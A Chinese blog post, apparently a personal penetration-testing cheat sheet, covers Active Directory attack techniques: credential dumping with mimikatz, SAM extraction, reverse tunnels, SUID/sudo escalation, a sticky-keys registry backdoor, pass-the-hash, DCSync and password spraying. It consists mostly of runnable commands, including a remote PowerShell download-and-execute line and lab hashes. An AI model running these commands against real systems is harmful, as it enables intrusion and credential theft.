+<h4 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h4><p>ACL 是 Access Control List（访问控制列表）的缩写。它是一种用于管理和控制访问权限的机制或数据结构。ACL 用于确定谁可以访问特定资源（例如文件、文件夹、网络资源等）以及他们可以执行的操作<br>一些不安全的acl</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GenericAll：完全控制对象，包括更改密码、注册SPN、添加AD对象到目标组里面</span><br><span class="line"> </span><br><span class="line">GenericWrite:更新对象的属性（例如登录脚本）</span><br><span class="line"> </span><br><span class="line">WriteOwner：更新目标对象的所有者，可以更改为攻击者控制的用户，接管对象</span><br><span class="line"> </span><br><span class="line">WriteDACL：更新对面的DACL，将ACL写入对面实体，直接授予我们的账户对对象的完全控制权</span><br><span class="line"> </span><br><span class="line">AllExtendedRights：能够对目标对象执行与扩展 AD 权限相关的任何操作。例如，能够将用户添加到组或重置密码。</span><br><span class="line"></span><br><span class="line">ForceChangePassword：强制改变当下的密码</span><br><span class="line"> </span><br><span class="line">AddMembers：可以对目标组添加用户（包括自己的账户）</span><br><span class="line"></span><br><span class="line">Self (Self-Membership)： 能够将自己添加到组中</span><br><span class="line"></span><br><span class="line">HasSIDHistory: SIDHistory是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的SID作为该对象的objectSid，在之前域中的SID会添加到该对象的sIDHistory属性中，此时该对象将保留在原来域的SID对应的访问权限</span><br></pre></td></tr></table></figure>
+<h3 id="内网资源探测"><a href="#内网资源探测" class="headerlink" title="内网资源探测"></a>内网资源探测</h3><h4 id="发现内网存活主机"><a href="#发现内网存活主机" class="headerlink" title="发现内网存活主机"></a>发现内网存活主机</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ICMP探测</span></span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL=&quot; #对网段循环ping</span><br><span class="line"><span class="meta">#</span><span class="bash">使用powershell脚本进行arp探测</span></span><br><span class="line">set-executionpolicy remotesigned；</span><br><span class="line">Import-Module .\Invoke-ARPScan.ps1</span><br><span class="line">Invoke-ARPScan -CIDR 192.168.92.1/24</span><br><span class="line">powshell.exe -exec bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://your-ip:port/Invoke-ARPScan.ps1&#x27;);Invoke-ARPScan -CIDR 192.168.92.1/24&quot; #也可以将脚本托管在服务器上，并通过powshell远程加载运行</span><br></pre></td></tr></table></figure>
+<h4 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">简单测试指定的端口号</span></span><br><span class="line">nc ip port</span><br><span class="line">telnet &lt;ip&gt; &lt;port&gt; </span><br><span class="line"><span class="meta">#</span><span class="bash">利用MetaSploite探测内网</span></span><br><span class="line">msfconsole</span><br><span class="line">search auxiliary/scanner </span><br></pre></td></tr></table></figure>
+
+<h5 id="Nmap进行端口扫描"><a href="#Nmap进行端口扫描" class="headerlink" title="Nmap进行端口扫描"></a>Nmap进行端口扫描</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap -PR [目标] #当目标主机与我们处于同一个网段的时候，使用ARP协议扫描技术就是最佳的选择</span><br><span class="line">nmap -PE [目标] #通过ICMP响应请求和应答进行主机发现</span><br><span class="line">nmap -sU [目标] #基于UDP协议</span><br><span class="line">nmap -sS [目标] #TCP SYN扫描</span><br><span class="line">nmap -sA [目标] #TCP ACK扫描</span><br><span class="line">nmap -sF [目标] #TCP FIN扫描</span><br><span class="line">nmap -sT [目标] # TCP Connect扫描(完成了三次握手)</span><br><span class="line">nmap -sV [目标] #版本扫描</span><br><span class="line"></span><br><span class="line">nmap -iL targets.txt路径 #扫描主机列表targets.txt中的所有目标地址</span><br></pre></td></tr></table></figure>
+<h3 id="收集用户凭证"><a href="#收集用户凭证" class="headerlink" title="收集用户凭证"></a>收集用户凭证</h3><p><strong>SAM文件</strong>是Windows用户的账户数据库,位于%SystemRoot%\System32\Config目录中,所有本地用户的用户名, 密码的哈希值等信息都被存放在这个数据库文件中.</p>
+<h4 id="本地用户的密码哈希"><a href="#本地用户的密码哈希" class="headerlink" title="本地用户的密码哈希"></a>本地用户的密码哈希</h4><h5 id="mimikatz读取"><a href="#mimikatz读取" class="headerlink" title="mimikatz读取"></a>mimikatz读取</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords full&quot;</span> <span class="built_in">exit</span> <span class="comment">#从lsass.exe进程的内存中读取当前已登录用户的凭据</span></span><br><span class="line"><span class="comment">#privilege::debug提升至DebugPrivilege权限</span></span><br><span class="line"><span class="comment">#sekurlsa::logonpasswords导出用户凭据</span></span><br><span class="line"></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;token::elevate&quot;</span> <span class="string">&quot;lsadump::sam&quot;</span> <span class="built_in">exit</span> <span class="comment">#在线读取本地Sam文件</span></span><br><span class="line"><span class="comment"># privilege::debug,用于提升至DebugPrivilege权限</span></span><br><span class="line"><span class="comment"># token::elevate,提升至system权限</span></span><br><span class="line"><span class="comment"># lsadump::sam,用于读取SAM文件</span></span><br></pre></td></tr></table></figure>
+<h5 id="离线破解"><a href="#离线破解" class="headerlink" title="离线破解"></a>离线破解</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\Users\Adrian\Desktop\system</span><br><span class="line">reg save hklm\sam C:\Users\Adrian\Desktop\sam</span><br><span class="line">reg save hklm\security C:\Users\Adrian\Desktop\security</span><br><span class="line">secretsdump.py LOCAL -system system -sam sam -security security</span><br></pre></td></tr></table></figure>
+<h4 id="从应用中获取信息"><a href="#从应用中获取信息" class="headerlink" title="从应用中获取信息"></a>从应用中获取信息</h4><h5 id="破解xshell"><a href="#破解xshell" class="headerlink" title="破解xshell"></a>破解xshell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\SharpXDecrypt.exe</span><br></pre></td></tr></table></figure>
+<h2 id="内网穿透与端口转发"><a href="#内网穿透与端口转发" class="headerlink" title="内网穿透与端口转发"></a>内网穿透与端口转发</h2><h3 id="ssh隧道搭建"><a href="#ssh隧道搭建" class="headerlink" title="ssh隧道搭建"></a>ssh隧道搭建</h3><p><code>ssh -L 8085:172.2.118.5:80 ctfshow@pwn.challenge.ctf.show -p 28259</code><br>ctfshow上的题,直接在本地运行即可，作用是通过ssh连接，把内网的172.2.118.5:80映射到本地127.0.0.1:8085</p>
+<h3 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h3><p>lcx是一个基于Socket套接字实现的端口转发工具，有Windows和Linux两个版本。Windows版为lcx.exe，Linux版为portmap</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave &lt;公网主机IP地址&gt; 4444 127.0.0.1 3389</span><br><span class="line"><span class="meta">#</span><span class="bash"> 功能和上面一样</span></span><br></pre></td></tr></table></figure>
+<h3 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h3><p>前面这几个一次只能转发一个端口,这个可以和proxychains4配合实现，内网kail打内网环境</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 1234 --reverse #在vps上运行</span><br><span class="line">./chisel client 123.60.135.22:1234 R:0.0.0.0:9383:socks #1234是建立连接的端口，9383是你设置的代理端口，代理ip还是你自己vps ip</span><br><span class="line"></span><br><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">socks5 vpsip 9383</span><br><span class="line"></span><br><span class="line">proxychains4 msfconsole #使用proxychains4代理运行程序</span><br></pre></td></tr></table></figure>
+<p>proxychains4还能让kail科学上网这里不再赘述</p>
+<h3 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l 1234 -s 123</span><br><span class="line">./linux_x64_agent -c Server_ip:1234 -s 123 --reconnect 8</span><br><span class="line"><span class="comment">#连接成功后在服务器端运行</span></span><br><span class="line">use 0</span><br><span class="line">socks 9383</span><br></pre></td></tr></table></figure>
+<h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">外</span></span><br><span class="line">[common]</span><br><span class="line"><span class="meta">#</span><span class="bash"> frp监听的端口，默认是7000，可以改成其他的</span></span><br><span class="line">bind_port = 7000</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">内</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = vps_ip #你自己vps的外网ip</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[RDP]   #这里演示的是远程桌面协议的端口转发</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 3389   #要转发的端口</span><br><span class="line">remote_port = 6000  #转发到外网ip的什么端口</span><br></pre></td></tr></table></figure>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><p>suid(set uid)是linux中的一种特殊权限，suid可以让调用者以文件拥有者身份运行该文件，所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。</p>
+<p>suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">ls -al /usr/bin/su</span><br><span class="line"><span class="meta">#</span><span class="bash">常用提权方式</span></span><br><span class="line"><span class="meta">#</span><span class="bash">find</span></span><br><span class="line">touch test</span><br><span class="line">find test -exec whoami \;</span><br><span class="line"><span class="meta">#</span><span class="bash">cp mv</span></span><br><span class="line"><span class="meta">#</span><span class="bash">覆盖 /etc/shadow 或 /etc/passwd</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">nmap（2.02-5.21）存在交换模式，可利用提权</span></span><br><span class="line">nmap --interactive</span><br><span class="line"><span class="meta">nmap&gt;</span><span class="bash"> !sh</span></span><br><span class="line">sh-3.2# whoami</span><br><span class="line">root</span><br><span class="line"><span class="meta">#</span><span class="bash">vi/vim</span></span><br><span class="line">sudo vim -c &#x27;!sh&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">bash</span></span><br><span class="line">bash -p</span><br><span class="line"><span class="meta">#</span><span class="bash">less more</span></span><br><span class="line">less /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">在less中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+<h4 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h4><p>Capabilities机制是在<strong>Linux内核2.2</strong>之后引入的，原理很简单，就是将之前与超级用户root（UID=0）关联的特权细分为不同的功能组，Capabilites作为线程（Linux并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。</p>
+<p>这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是root，就去检查其是否具有该特权操作所对应的capabilities，并以此为依据，决定是否可以执行特权操作。</p>
+<p>如果Capabilities设置不正确，就会让攻击者有机可乘，实现权限提升。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="SUDO滥用提权"><a href="#SUDO滥用提权" class="headerlink" title="SUDO滥用提权"></a>SUDO滥用提权</h4><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -l <span class="comment">#列出当前用户可以以超级用户（root）身份执行的命令列表</span></span><br><span class="line"><span class="comment">#https://gtfobins.github.io/ 这里面更加详细</span></span><br><span class="line">sudo mysql -e <span class="string">&#x27;\! /bin/sh&#x27;</span></span><br></pre></td></tr></table></figure>
+<h4 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h4><p><a target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a><br>gcc -pthread dirty.c -o exp -lcrypt<br> ./exp<br>su firefart </p>
+<h3 id="win"><a href="#win" class="headerlink" title="win"></a>win</h3><h4 id="烂土豆提权"><a href="#烂土豆提权" class="headerlink" title="烂土豆提权"></a>烂土豆提权</h4><p>只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（<strong>IIS</strong>、**MSSQL(SQL Server的简称)**等）有这个权限，大多数用户级的账户没有这个权限</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/sweetpotato.exe -a whoami</span><br></pre></td></tr></table></figure>
+<h4 id="注册表提权"><a href="#注册表提权" class="headerlink" title="注册表提权"></a>注册表提权</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get-acl -path <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | fl * <span class="comment">#显示指定注册表项的访问控制列表,查看是否有修改注册表的权限</span></span><br><span class="line"></span><br><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span> <span class="comment">#把本来用户主页点放大镜启动替换为cmd</span></span><br><span class="line"></span><br><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span> <span class="comment">#把本来用户shift粘滞键启动替换为cmd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#最后点左下角的头像锁屏，按功能触发</span></span><br></pre></td></tr></table></figure>
+<h4 id="远程桌面控制"><a href="#远程桌面控制" class="headerlink" title="远程桌面控制"></a>远程桌面控制</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec rdp 172.22.6.0/24 -u wenshao -p hellokitty -d xiaorang.lab</span><br></pre></td></tr></table></figure>
+<h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="mysql-UDF提权"><a href="#mysql-UDF提权" class="headerlink" title="mysql UDF提权"></a>mysql UDF提权</h4><ol>
+<li>查找插件库的路径<br><code>show variables like &#39;%plugin%&#39;</code></li>
+<li>将so文件的内容解码，写入到mysql插件库目录中<br><code>select unhex(&#39;so文件的16进制编码&#39;) into dumpfile &#39;/usr/lib64/mysql/plugin/xxx.so&#39;</code></li>
+<li>创建函数<br><code>create function sys_eval returns string soname &#39;xxx.so&#39;;</code></li>
+<li>执行系统命令<br><code>select sys_eval(&quot;whoami&quot;);</code></li>
+</ol>
+<h2 id="域内横向"><a href="#域内横向" class="headerlink" title="域内横向"></a>域内横向</h2><h3 id="IPC-amp-at-amp-schticks"><a href="#IPC-amp-at-amp-schticks" class="headerlink" title="IPC$ &amp; at &amp; schticks"></a>IPC$ &amp; at &amp; schticks</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> IPC$ 连接</span></span><br><span class="line">net use \\192.168.52.138\ipc$                   # 建立空连接</span><br><span class="line">net use \\192.168.52.138\ipc$ &quot;password&quot; /user:&quot;Administrator&quot;  # 建立非空连接</span><br><span class="line"><span class="meta">#</span><span class="bash"> IPC$ 连接建立之后的操作</span></span><br><span class="line">dir \\192.168.52.138\c$                             # 列出目标文件目录</span><br><span class="line">type \\192.168.52.138\c$\1.txt  #远程读取文件                                       </span><br></pre></td></tr></table></figure>
+<h4 id="at-amp-schtasks-使用"><a href="#at-amp-schtasks-使用" class="headerlink" title="at &amp; schtasks 使用"></a>at &amp; schtasks 使用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.52.138 #查看目标系统的时间</span><br><span class="line">copy calc.bat \\192.168.52.138\c$ #将文件复制到远程主机的c盘</span><br><span class="line">at \\192.168.52.138 4:11pm c:\calc.bat #设置定时任务</span><br></pre></td></tr></table></figure>
+<p>windows server2008以后的版本at命令已经被弃用了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">copy hack.bat \\192.168.52.138\c$</span><br><span class="line">schtasks /create /tn hack /tr C:\hack.bat /sc ONSTART /s 192.168.52.138 /ru &quot;system&quot; /u administrator /p Abc123456！ #创建了名为hack的计划任务，设置计划任务在系统启动时触发，指定以系统权限（Local System）运行该计划任务。如果没有建立ipc$需要/u/p</span><br><span class="line">schtasks /run /tn hack /s 192.168.52.138</span><br><span class="line">schtasks /delete /s 192.168.52.138 /u administrator /p Abc123456! /tn hack /f</span><br></pre></td></tr></table></figure>
+
+<h3 id="windows-Kerberos身份认证协议"><a href="#windows-Kerberos身份认证协议" class="headerlink" title="windows Kerberos身份认证协议"></a>windows Kerberos身份认证协议</h3><p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1-1024x700.png" alt="1-1024x700"><br>krbtgt 用户，该用户是在创建域时系统自动创建的一个账号，其作用是密钥发行中心的服务账号，其密码是系统随机生成的，无法正常登陆主机。</p>
+<p>SPN是服务器上所运行服务的唯一标示，每个使用Kerberos的服务都需要一个SPN，这样客户端才可以辨认这个服务。</p>
+<p>可以把kerberos认证流程简要的分为三个部分：</p>
+<h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p>client向<strong>AS(Authentication Service)<strong>证明自己的身份的过程，目标是获取</strong>TGT(Ticket Granting Ticket)<strong>票据<br>请求包中包含：请求的用户名、客户端主机名、加密类型和</strong>Authenticator</strong>(用户NTLM hash加密的时间戳)以及一些其他信息。<br>AS会返回给Client一个<strong>Logon Session Key</strong>（请求用户client的NTLM hash对Session-key as进行加密）和<strong>krbtgt用户 hash加密的TGT票据</strong>(TGT里面包含PAC，PAC包含Client的域sid、Client所在的组)</p>
+<h5 id="HASH传递（PTH）"><a href="#HASH传递（PTH）" class="headerlink" title="HASH传递（PTH）"></a>HASH传递（PTH）</h5><p>hash 传递的原理是在认证过程中，并不是直接使用用户的密码进行认证的，而是使用用户的hash值，因此，攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不需要提供明文密码(前提是得有相应的权限)</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#运行mimikatz.exe</span></span><br><span class="line">privilege::debug  <span class="comment">#提升权限</span></span><br><span class="line">token::elevate <span class="comment">#将权限提升至system</span></span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords <span class="comment">#导出用户hash</span></span><br><span class="line">sekurlsa::pth /user:WIN2016$ /domain:XIAORANG /ntlm:adcd60560397bbaf2cd059dfe4676f77 <span class="comment">#获取后进行hash传递，登录域控</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用脚本连接</span></span><br><span class="line">proxychains impacket-wmiexec xiaorang.lab/Administrator@172.22.3.2 -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb -dc-ip 172.22.3.2</span><br><span class="line">proxychains python3 smbexec.py -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@172.22.3.26 -codec gbk</span><br><span class="line"></span><br><span class="line">proxychains crackmapexec smb 172.22.9.7 -u administrator -H2f1b57eefb2d152196836b0516abea80 -d xiaorang.lab -x <span class="string">&quot;type Users\Administrator\flag\flag04.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="DCsync攻击获取域内用户hash"><a href="#DCsync攻击获取域内用户hash" class="headerlink" title="DCsync攻击获取域内用户hash"></a>DCsync攻击获取域内用户hash</h5><p>DCSync是AD域渗透中常用的凭据窃取手段，默认情况下，域内不同DC每隔15分钟会进行一次数据同步，当一个DC从另外一个DC同步数据时，发起请求的一方会通过目录复制协议（MS- DRSR）来对另外一台域控中的域用户密码进行复制，DCSync就是利用这个原理，“模拟”DC向真实DC发送数据同步请求，获取用户凭据数据</p>
+<p>默认以下用户存在该权限</p>
+<pre><code>DC本地Administrators组内的用户
+Domain Admins组内的用户
+Enterprise Admins组内的用户    企业管理员
+域控制器的计算机/机器帐户
+</code></pre>
+<p>默认只有<strong>域控主机账号</strong>和<strong>域管理员</strong>能DCSYNC</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#msf中</span></span><br><span class="line">load kiwi <span class="comment">#加载mimikatz</span></span><br><span class="line">kiwi_cmd <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="comment">#执行一个DCSync攻击模拟，获取administrator的hash</span></span><br><span class="line"></span><br><span class="line">proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span> <span class="comment">#使用kail自带的crackmapexec工具进行HASH传递，并登录172.22.1.2在上面执行命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#也可以用脚本</span></span><br><span class="line">proxychains secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm</span><br></pre></td></tr></table></figure>
+<h6 id="writeDacl权限"><a href="#writeDacl权限" class="headerlink" title="writeDacl权限"></a>writeDacl权限</h6><p>具有 WriteDACL 权限, 也可以写 DCSync</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 dacledit.py xiaorang.lab/XIAORANG-EXC01\$ -hashes :4de6c4eeee1f315e1241c4a813e2b3b5 -action write -rights DCSync -principal Zhangtong -target-dn <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> -dc-ip 172.22.3.2 <span class="comment">#对Zhangtong用户写 DCSync</span></span><br><span class="line">proxychains python3 secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm <span class="comment">#DCsync攻击获取域控hash</span></span><br><span class="line">proxychains python3 wmiexec.py xiaorang.lab/Administrator@172.22.3.2 -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb -dc-ip 172.22.3.2 <span class="comment">#pth</span></span><br></pre></td></tr></table></figure>
+<h6 id="PTH-的限制-UAC"><a href="#PTH-的限制-UAC" class="headerlink" title="PTH 的限制 UAC"></a>PTH 的限制 UAC</h6><h5 id="域内用户枚举"><a href="#域内用户枚举" class="headerlink" title="域内用户枚举"></a>域内用户枚举</h5><p>在kerberos的AS-REQ认证中当cname值中的用户不存在时返回包提示KDC_ERR_C_PRINCIPAL_UNKNOWN</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute_linux_386 userenum --dc 172.22.6.12 -d xiaorang.lab usersname.txt -t 10</span><br></pre></td></tr></table></figure>
+<h5 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.4.45 -u Adrian -p rockyou.txt -d WIN19</span><br><span class="line"></span><br><span class="line">proxychains4 hydra -L user.txt -P pass.txt 172.22.9.26 rdp &gt;&gt;result.txt</span><br><span class="line">cat result.txt|| grep account</span><br><span class="line"></span><br><span class="line">proxychains ./kerbrute_darwin_amd64 passwordspray --dc 172.22.9.7 -d xiaorang.lab ~/user.txt i9XDE02pLVf</span><br></pre></td></tr></table></figure>
+<h5 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h5><p>关闭预身份验证后，在进行AS_REQ之后的时候，KDC不会进行任何验证就将TGT和用该用户Hash加密的Login Session Key返回，由于AS_REP的数据包中Login Session Key的是由用户Hash进行加密的，因此，可以对获取到的用户Hash加密的Login Session Key进行离线爆破，得到对应用户的明文密码</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute_darwin_amd64 userenum --dc 172.22.6.12 -d xiaorang.lab ~/users.txt -o output.txt <span class="comment">#枚举未设置预认证的账号</span></span><br><span class="line">hashcat -m 18200 1.txt -a 0 ./rockyou.txt  --force <span class="comment">#爆破密码</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h5><p>(1):域名称<br>(2):域的SID值<br>(3):域的krbtgt账户密码HASH<br>(4):伪造用户名，可以是任意的</p>
+<p>获取krbtgt的hash值，该值的方式有两种：</p>
